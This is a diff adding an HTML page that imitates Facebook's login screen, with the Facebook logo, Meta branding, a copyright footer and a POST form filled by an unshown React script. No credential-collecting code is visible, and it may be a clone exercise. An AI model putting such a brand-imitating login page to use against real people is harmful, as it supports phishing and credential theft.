@@ -1,0 +1,75 @@
+
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="shortcut icon" href="./public/Instagram_icon.png" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FaceBook</title>
+
+  <script src="https://unpkg.com/react@17/umd/react.development.js"></script>
+<script src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
+
+  
+  <!-- Preconnect for Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+    rel="stylesheet">
+  
+  <!-- Local CSS -->
+  <link rel="stylesheet" href="../index.css">
+
+  <!-- Tailwind CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+
+</head>
+
+<body style="background-color: #F2F4F7;">
+  <div class="container mt-5">
+    <div class="backgroundimg">
+      <div class="image-in relative mt-50px" id="cf"></div>
+    </div>
+
+    <div class="into-container text-right">
+      <div class="signup grid justify-center">
+        <div class="text-center font-medium">
+          <span>English (UK)</span>
+        </div>
+        <div class="items-center justify-center ml-[125px] mt-12 grid">
+          <img style="height: 70px; width:70px" 
+               src="https://cdn.freebiesupply.com/logos/large/2x/facebook-logo-2019.png" 
+               alt="facebook">
+        </div>
+
+        <form class="form-middle" method="post">
+          
+          <div id="root"></div>
+          <!-- JS Script -->
+           <script type="module" src="./indexx.jsx"></script>
+           
+          <div class="items-center justify-center grid mt-20">
+            <span class="flex w-[65px] pl-[15px] font-bold">from</span>
+            <div class="flex justify-between">
+              <img style="height: 17px; width: 17px; margin-top: 4px;" 
+                   class="bg-white-500" 
+                   src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/meta-black-icon.png" 
+                   alt="meta">
+              <span class="font-bold mt-[-3px] pl-[4px] ml-1">Meta</span>
+            </div>
+            
+          </div>
+          <span class="mt-5 items-center justify-center grid pb-[15px]">
+            © 2025 facebook from Meta
+          </span>
+        </form>
+      </div>
+    </div>
+  </div>
+</body>
+
+</html>
